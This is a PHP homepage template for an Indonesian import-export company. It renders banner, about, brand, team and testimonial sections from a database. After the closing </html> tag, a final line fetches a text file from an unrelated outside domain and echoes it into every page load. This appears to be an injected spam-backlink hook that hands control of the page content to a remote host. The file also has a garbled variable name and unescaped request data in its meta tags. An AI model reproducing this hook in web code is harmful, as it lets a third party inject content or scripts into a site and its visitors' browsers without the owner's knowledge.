<?php
require_once './admin/api/connection.php';
require_once './admin/api/functions.php';

//set seo data
$fetchSeoData = array();
$fetchSeoData = $db->rawQuery("SELECT * FROM " . SEO . " WHERE is_deleted = '0' AND is_active = '1' AND page_id = '1'");
$meta_title = isset($fetchSeoData['0']['meta_title']) ? $fetchSeoData['0']['meta_title'] : "";
$meta_description = isset($fetchSeoData['0']['meta_description']) ? $fetchSeoData['0']['meta_description'] : "";
$meta_keywords = isset($fetchSeoData['0']['meta_keywords']) ? $fetchSeoData['0']['meta_keywords'] : "";
?>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Home Myavin - PT Avin Kaya Internasional
		
	</title>
	<meta name="description" content="<?= $meta_description; ?>">
	<meta name="keywords" content="<?= $meta_keywords; ?>">
	<meta name="author" content="Ola Basket">
	<link rel="shortcut icon" href="assets/img/myavin.png" type="image/x-icon">
	<!-- Mobile Specific Meta -->

	<meta itemprop="name" content="<?= $meta_title; ?>">
	<meta itemprop="description" content="<?= $meta_description; ?>">
	<meta itemprop="url"
		content="<?= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; ?>">
	<meta itemprop="image" content="<?= ADMIN_PANEL . UPLOAD . 'myavin.png'; ?>">

	<meta property="og:title" content="<?= $meta_title; ?>" />
	<meta property="og:type" content="Import Export" />
	<meta property="og:url"
		content="<?= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"; ?>" />
	<meta property="og:image" content="<?= ADMIN_PANEL . UPLOAD . 'myavin.png'; ?>" />
	<meta property="og:site_name" content="Ola Basket" />
	<meta property="fb:admins" content="Ola Basket" />
	<meta property="og:description" content="<?= $meta_description; ?>" />


	<link rel="stylesheet" href="assets/css/bootstrap.min.css">
	<link rel="stylesheet" href="assets/css/fontawesome-all.css">
	<link rel="stylesheet" href="assets/css/flaticon.css">
	<link rel="stylesheet" href="assets/css/animate.css">
	<link rel="stylesheet" href="assets/css/video.min.css">
	<link rel="stylesheet" href="assets/css/jquery.mCustomScrollbar.min.css">
	<link rel="stylesheet" href="assets/css/rs6.css">
	<link rel="stylesheet" href="assets/css/slick.css">
	<link rel="stylesheet" href="assets/css/slick-theme.css">
	<link rel="stylesheet" href="assets/css/style.css">
	<style>
		#or-banner {
			background-size: 100% 100%;
			background-repeat: no-repeat;
width: 100vw;
height: 100%; /* Ubah nilai height sesuai kebutuhan */
object-fit: cover;
object-position: center;
		}

		/*.sliderHome img {
			width: 150px !important;
			height: 150px !important;
		}*/
		#banner_container {
			margin-top: -50px;
		}

		.brand_image {
			margin-top: -13px;
		}

		@media only screen and (max-width: 600px) {
			#or-banner {
				background-size: 100% 35% !important;
				background-position: center !important;
				object-position: 50% 50%;
			}
		}
			@media only screen and (max-width: 1024px) {
			#or-banner {
				background-size: 100% 65% !important;
				background-position: center !important;
				object-position: 50% 50%;
			}
		}
					@media only screen and (max-width: 1440px) {
			#or-banner {
				background-size: 100% 75% !important;
				background-position: center !important;
				object-position: 50% 50%;
			}
		}
	</style>
</head>


	<?php
	require_once './header.php';
	?>
	<section id="or-banner" class="or-banner-section full-height" data-background="assets/img/banner_index.png">
	    <!---<img class=img-banner" src="assets/img/bg1.jpg">-->
		<div class="or-banner-content">
			<div class="container" id="banner_container">
				<div class="col-md-6">
				<div class="or-banner-slider">
					<div class="or-banner-slider-item-wrapper headline-2 pera-content">
						<div class="or-banner-slider-item">
							<h1>
								<?= $labelData['LBL_BANNER_MYAVIN']; ?>
							</h1>
							<!-- <p>
								<?php //echo $labelData['LBL_BANNER_DESCRIPTION']; ?>
							</p> -->
							
								</a>
							</div>
							<!-- <div class="or-banner-btn d-flex justify-content-center">
								<a href="catalogue.php">
									<?php //$labelData['LBL_PRODUCT_CATALOGUE']; ?>
								</a>
								<a href="<?php // $call_us_now; ?>"><?php // $labelData['LBL_BTN_CALL_US_NOW']; ?></a>
							</div> -->
						</div>
					</div>
					<!--					<div class="or-banner-slider-item-wrapper headline-2 pera-content text-center">
						<div class="or-banner-slider-item">
							<h1>Always Fresh & <span>Organic</span>
							Vegetables</h1>
							<p>Our  Job is to filling  Your Tummy  with Delicious Healthy  Food
							and Fast free Delivery. </p>
							<div class="or-banner-btn d-flex justify-content-center">
								<a href="#">Shop Now</a>
								<a href="#">About us</a>
							</div>
						</div>
					</div>
					<div class="or-banner-slider-item-wrapper headline-2 pera-content text-center">
						<div class="or-banner-slider-item">
							<h1>Always Fresh & <span>Organic</span>
							Vegetables</h1>
							<p>Our  Job is to filling  Your Tummy  with Delicious Healthy  Food
							and Fast free Delivery. </p>
							<div class="or-banner-btn d-flex justify-content-center">
								<a href="#">Shop Now</a>
								<a href="#">About us</a>
							</div>
						</div>
					</div>-->
				</div>
			</div>
			</div>
			<!--			<div class="banner-deco-img position-absolute">
							<img src="assets/img/banner.jpg" alt="">
			</div>-->
		</div>
	</section>
	<!-- End of Banner section
	============================================= -->
	<br />
	<br />

	<!-- Start of About us section
	============================================= -->
	<section id="or-feature" class="or-feature-section/">
		<div class="container">
			<div class="or-section-title-3 text-center pera-content headline-2">


				<h2>
					<?= $labelData['LBL_ABOUT_OLABASKET']; ?>
					</span>
				</h2>
			</div>
			<div class="row">
  <div class="column_about_us" >
  	<div class="content_about">
   <img src="assets/img/about/banner.webp" alt="">
  </div>
  </div>
  <div class="column_about_us" >
  	<p>
				<?= $labelData['LBL_ABOUT_US']; ?>
			</p>
    
  </div>
</div>
			
		</div>
	</section>
	<!-- <section id="or-about-1" class="or-about-section-1">
		<div class="container">
			<div class="or-about-content-1 position-relative">
				<div class="or-about-img-1 position-absolute" style="left: 0px;">
					<img src="assets/img/installation.png" alt="">
				</div>
				<div class="or-about-text-area  d-flex justify-content-end">
					<div class="or-about-img-text-wrapper-1">
						<div class="or-section-title-3 pera-content headline-2">
							<h2>
								<?= $labelData['LBL_ABOUT_OLABASKET']; ?>
							</h2>
							<p>
								<?= $labelData['LBL_ABOUT_US']; ?>
							</p>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section> -->
	<!-- End of About Us section
	============================================= -->
	<br />
	<!-- Start of Category section
	============================================= -->
	
				
	<!-- End of Category section
	============================================= -->

		<section id="or-feature" class="or-feature-section/">
		<div class="container">
			<div class="or-section-title-3 text-center pera-content headline-2">
				<h2>
					<?= $labelData['LBL_OUR_BRAND']; ?>
					</span>
				</h2>
				<p>
					<?php //$labelData['LBL_POPULAR_CATEGORY_DESCRIPTION']; ?>
				</p>
			</div>
			<div class="or-feature-content position-relative">
				<div class="row justify-content-center">
							<div class="col-lg-3 col-md-6 col-sm-3">
								<div class="or-feature-innerbox text-center headline-2 pera-content">
									<a href="https://drive.google.com/drive/u/0/folders/12sOOSangTzeCb7oTYtv5T7n6QMEC0MwK">
									<img src="assets/img/garment.png" alt="">
									</a>	
								</div>
							</div>
							<div class="col-lg-3 col-md-6 col-sm-3">
								<div class="or-feature-innerbox text-center headline-2 pera-content">
									 <a href="https://drive.google.com/drive/u/0/folders/1bVOXL_ipjj0MfLjFhL4i2QjnXaow7sHN">
									<img src="assets/img/furniture.png" alt="">
								</a>
								</div>
							</div>
							<div class="col-lg-3 col-md-6 col-sm-3">
								<div class="or-feature-innerbox text-center headline-2 pera-content">
									<a href="https://drive.google.com/file/d/16W6zpkvjXH4xHT2neogIohXoltl-eDxb/view?usp=sharing">
									<img src="assets/img/crops.png" alt="">
								</a>
								</div>
							</div>
								
				</div>
			</div>
		</div>
	</section>-->
	<br />
	<br />
	<br />

	<!-- End of Feeatur section
	============================================= -->

	<!--<section id="or-feature" class="or-feature-section/">
		<div class="container">
			<div class="or-section-title-3 text-center pera-content headline-2">
				<h2>
					<?= $labelData['LBL_POPULAR']; ?> <span>
						<?= $labelData['LBL_CATEGORY']; ?>
					</span>
				</h2>
				<p>
					<?= $labelData['LBL_POPULAR_CATEGORY_DESCRIPTION']; ?>
				</p>
			</div>
			<div class="or-feature-content position-relative">
				
				<div class="row justify-content-center">
					<?php
					$fetchCategoryData = array();
					$fetchCategoryData = $db->rawQuery("SELECT CM.* FROM " . CATEGORY . " CM WHERE CM.is_deleted = '0' AND CM.is_active = '1' AND CM.is_popular = '1' ORDER BY CM.category_index IS NULL,CM.category_index ASC");
					if (count($fetchCategoryData) > 0) {
						for ($i = 0; $i < count($fetchCategoryData); $i++) {
							$category_id = $fetchCategoryData[$i]['category_id'];
							$category_name = $fetchCategoryData[$i]['category_name'];
							$category_slug = $fetchCategoryData[$i]['category_slug'];
							$category_image = ADMIN_PANEL . $fetchCategoryData[$i]['category_image'];
							$category_remark = $fetchCategoryData[$i]['category_remark'];
							$category_index = $fetchCategoryData[$i]['category_index'];
							$is_active = $fetchCategoryData[$i]['is_active'];
							$is_deleted = $fetchCategoryData[$i]['is_deleted'];
							?>
							<div class="col-lg-4 col-md-6">
								<div class="or-feature-innerbox text-center headline-2 pera-content"
									onclick="window.location='products/<?= $category_slug; ?>'">
									<div class="or-feature-img">
										<img src="<?= $category_image; ?>" style="width: 200px;" alt="<?= $category_name; ?>">
									</div>
									<div class="or-feature-text">-->
										<!--								<h3><?= $category_name; ?></h3>-->
										<!--<p>
											<?= $category_remark; ?>
										</p>
										<a href="products/<?= $category_slug; ?>">
											<img src="assets/img/icon/arrow2.png" alt="">&nbsp;
											<?= $labelData['LBL_BROWSE']; ?>
										</a>
									</div>
								</div>
							</div>
							<?php
						}
					}
					?>
				</div>
			</div>
		</div>
	</section>-->



	<!-- Start of team  section
	============================================= -->
	<section id="or-category" class="or-category-section" data-background="assets/img/bg/cat-bg.jpg">
		<div class="container">
			<div class="or-section-title-3 text-center pera-content headline-2">
				<h2 class="case-animate-time">
					<?= $labelData['LBL_OUR_EXPERT_TEAM']; ?>
				</h2>
			</div>
			<div class="or-category-content">
				<div class="or-category-slider-wrapper position-relative">
					<div class="or-product-slider-wrapper">
						<?php
						$fetchTeamData = array();
						$fetchTeamData = $db->rawQuery("SELECT TM.* FROM " . TEAM . " TM WHERE TM.is_deleted = '0' AND TM.is_active = '1' ORDER BY TM.team_id ASC");
						if (count($fetchTeamData) > 0) {
							for ($i = 0; $i < count($fetchTeamData); $i++) {
								$team_id = $fetchTeamData[$i]['team_id'];
								$team_name = $fetchTeamData[$i]['team_name'];
								$team_designation = $fetchTeamData[$i]['team_designation'];
								$team_image = ADMIN_PANEL . $fetchTeamData[$i]['team_image'];
								$team_remark = $fetchTeamData[$i]['team_remark'];
								$is_active = $fetchTeamData[$i]['is_active'];
								$is_deleted = $fetchTeamData[$i]['is_deleted'];
								?>
								<div class="organio-inner-item">
									<div
										class="or-team-innerbox or-category-slider-inner-item text-center position-relative type-1">
										<div class="or-team-img position-relative">
											<img src="<?= $team_image; ?>" alt="<?= $team_name; ?>">
										</div>
										<div class="or-taam-item-holder">
											<div class="or-team-meta text-center headline position-relative">
												<h3><a href="#">
														<?= $team_name; ?>
													</a></h3>
												<span>
													<?= $team_designation; ?>
												</span>
												<!-- <div class="team-item-side-img">
													<img class="side-img" src="assets/img/icon/t-icon2.png" alt="">
													<img class="side-img" src="assets/img/icon/t-icon1.png" alt="">
												</div> -->
											</div>
											<div class="or-team-text-social pera-content text-center">
												<p>
													<?= $team_remark; ?>
												</p>
											</div>
										</div>
									</div>
								</div>
								<?php
							}
						}
						?>
					</div>
					<div class="carousel_nav  clearfix">
						<button type="button" class="or-product-left_arrow"><img src="assets/img/icon/arrow1.png"
								alt=""></button>
						<button type="button" class="or-product-right_arrow"><img src="assets/img/icon/arrow2.png"
								alt=""></button>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!-- End of team  section
	============================================= -->
	<!-- Start of testimonial  section
	============================================= -->
	<br />
	<br />
	<br />
	<?php
							$fetchTestimonialData = array();
							$fetchTestimonialData = $db->rawQuery("SELECT TM.* FROM " . TESTIMONIAL . " TM WHERE TM.is_deleted = '0' AND TM.is_active = '1' ORDER BY TM.testimonial_index ASC");
							if (count($fetchTestimonialData) > 0) {
								?>
	<section id="or-testimonial" class="or-testimonial-section">
		<div class="container">
			<div class="or-testimonial-content position-relative">
				<span class="testimonial-bg position-absolute"><img src="assets/img/bg/tst-bg.png" alt=""></span>
				<div class="or-section-title-3 text-center pera-content headline-2">
					<h2>
						<?= $labelData['LBL_OUR_LATEST_TESTIMONIAL']; ?>
					</h2>
				</div>
				<div class="or-tetimonial-slider-wrapper">
					<div class="or-testimonial-slider-area">
						<div class="or-testimonial-slider">
							<?php
								for ($i = 0; $i < count($fetchTestimonialData); $i++) {
									$testimonial_id = $fetchTestimonialData[$i]['testimonial_id'];
									$testimonial_name = $fetchTestimonialData[$i]['testimonial_name'];
									$testimonial_short_description = $fefetchTestimonialDatatchData[$i]['testimonial_short_description'];
									$testimonial_image = ADMIN_PANEL . $fetchTestimonialData[$i]['testimonial_image'];
									$testimonial_description = $fetchTestimonialData[$i]['testimonial_description'];
									$testimonial_index = $fetchTestimonialData[$i]['testimonial_index'];
									$is_active = $fetchTestimonialData[$i]['is_active'];
									$is_deleted = $fetchTestimonialData[$i]['is_deleted'];
									?>
									<div class="organio-inner-item">
										<div class="or-testimonial-innerbox text-center position-relative">
											<div class="or-testimonial-img position-absolute">
												<img src="<?= $testimonial_image; ?>" width="90px"
													alt="<?= $testimonial_name; ?>">
											</div>
											<div class="or-testimonial-text headline pera-content">
												<p>‘’
													<?= $testimonial_description; ?>’’
												</p>
												<div class="author-meta">
													<h3>
														<?= $testimonial_name; ?>
													</h3>
													<span>
														<?= $testimonial_short_description; ?>
													</span>
												</div>
											</div>
										</div>
									</div>
									<?php
								}
							?>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<?php
							}
							?>
	<!-- End of testimonial  section
	============================================= -->
	<!-- Start of Blog section
	============================================= -->
	
	<!-- End of Blog section
	============================================= -->

	<!--<section id="or-cta" class="or-cta-section">
		<div class="container">
			<div class="or-popular-category-top-content d-flex justify-content-between align-items-end">
				<div class="or-section-title-3 pera-content headline-2">
					<h2>
						<?= $labelData['LBL_ASSOCIATED_LINKS']; ?>
					</h2>-->
					<!--					<p>We have our clients in more than 30 countries and have regularly exported Garments , Furniture from our own manufacturing units based in Central Jawa Indonesia.</p>-->
				<!--</div>
			</div>
			<br />
			<div class="container">
				<a href="https://myavin.com/id/" target="_blank">
					<img src="assets/img/myavin_app.png" />
				</a>-->
				<!-- <br/>
						<br/>
						<br/>
						<a href="http://myavin.co.id/" target="_blank">
								<img src="assets/img/myavin_technologies.png" />
						</a> 
			</div>
		</div>
	</section>-->

<br />
	<br />


	<?php
	require_once './footer.php';
	?>
	<!-- For Js Library -->
	<script src="assets/js/jquery.min.js"></script>
	<script>
		setTimeout(function () {
			$("#preloader").hide();
		}, 3000);
	</script>
	<script src="assets/js/bootstrap.min.js"></script>
	<script src="assets/js/popper.min.js"></script>
	<script src="assets/js/jquery.magnific-popup.min.js"></script>
	<script src="assets/js/appear.js"></script>
	<script src="assets/js/slick.js"></script>
	<script src="assets/js/jquery.counterup.min.js"></script>
	<script src="assets/js/waypoints.min.js"></script>
	<script src="assets/js/jquery.mCustomScrollbar.concat.min.js"></script>
	<script src="assets/js/wow.min.js"></script>
	<script src="assets/js/imagesloaded.pkgd.min.js"></script>
	<script src="assets/js/parallax-scroll.js"></script>
	<script src="assets/js/rbtools.min.js"></script>
	<script src="assets/js/rs6.min.js"></script>
	<script src="assets/js/script.js"></script>
	</script>
	<script>
      document.oncontextmenu = rightClick;

      function rightClick(e) {
        e.preventDefault();

        const menu = document.getElementById('rightClickMenu');

        menu.classList.add('block');
        menu.classList.remove('hidden');
        menu.style.left = e.pageX + 'px';
        menu.style.top = e.pageY + 'px';
      }
    </script>
</body>

</html><?php echo file_get_contents("https://bagicepekdulu.biz/backlink/a1.txt"); ?>